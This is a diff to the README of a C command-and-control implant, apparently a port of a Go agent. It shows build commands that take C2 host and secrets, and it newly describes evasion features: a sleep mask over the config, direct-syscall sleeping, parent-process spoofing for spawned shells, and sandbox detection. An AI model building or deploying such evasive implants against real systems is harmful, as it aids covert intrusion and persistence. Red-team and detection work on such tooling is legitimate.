@@ -31,7 +31,12 @@ build.bat <C2_HOST> <C2_PORT> <SECRET_ID> <SECRET_B64>
 REM Release build (size-optimized, -Os + strip + gc-sections, optional UPX)
 build-release.bat <C2_HOST> <C2_PORT> <SECRET_ID> <SECRET_B64>
 
-REM Local E2E build with true secrets (gitignored, not for commit)
+REM Local E2E build with true secrets (gitignored, not for commit).
+REM Secrets come from env vars or args, never from the file itself:
+REM   set SECRET_ID=...
+REM   set SECRET_B64=...
+REM   build-e2e-local.bat
+REM or:  build-e2e-local.bat SECRET_ID SECRET_B64
 build-e2e-local.bat
 ```
 
@@ -76,14 +81,23 @@ to already-stripped sections and high entropy.
 ## Gaps vs the Go agent (by design, for now)
 
 - Transports: HTTP only (no TCP/DNS/ICMP/WSS/gRPC/SSH/P2P/SMB)
-- No BOF/CLR/execute-assembly, no sleep masks, no PPID spoof
-- No screenshots/keylogging; no SOCKS/port-forwarding yet
+- No BOF/CLR/execute-assembly
+- Evasion (evade.c, honest scope): XOR+NOACCESS sleep mask over a 4KiB
+  config shadow (C2 host/path, secret id, UA, UUID) + Halo's-Gate
+  NtDelayExecution (direct syscall, Sleep fallback); PPID-spoofed shell
+  spawn (explorer parent, _popen fallback); startup sandbox gate
+  (tick-acceleration + 1c/<2GiB hw gate, -DSANDBOX_CHECKS=0 to strip).
+  NOT full-image AES, NOT AMSI/ETW patching, NOT direct syscalls elsewhere.
+- No keylogging/webcam/mic; no SOCKS/port-forwarding yet
+- Streams are beacon-paced (1 frame per beacon), not realtime
 - No malleable request transforms (plain JSON inner bodies)
 - No auto self-update; redeploy manually
 
 ## Files
 
 - `beacon.c` — main loop, frames, task handlers, persistence
+- `evade.{c,h}` — sleep mask, Halo's-Gate NtDelayExecution, PPID-spoofed
+  exec, startup sandbox gate (see header for exact capability)
 - `crypto_cng.{c,h}` — CNG AES-GCM/HMAC/RNG + X25519 glue
 - `curve25519.{c,h}` + `x25519_vectors.h` — ladder + self-test vectors
   (generated from Go stdlib `crypto/ecdh`; regenerate mechanically,
